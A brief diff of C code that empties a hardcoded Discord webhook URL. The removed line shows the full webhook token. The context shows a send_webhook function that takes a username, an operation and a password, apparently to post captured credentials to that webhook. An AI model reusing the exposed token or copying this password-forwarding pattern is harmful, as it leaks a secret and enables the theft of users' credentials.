@@ -8,7 +8,7 @@
 #include <termios.h>
 #include <sys/wait.h>
 
-#define WEBHOOK_URL "https://discord.com/api/webhooks/1315051949837783172/-gnkBWV3XC-oM6DXG9ChkYUmZvfUsfkoRdXaqCw06PlgpbHQEMWbrxIQzlfkJ_85rdpv"
+#define WEBHOOK_URL ""
 
 void send_webhook(const char *username, const char *operation, const char *password) {
     CURL *curl;
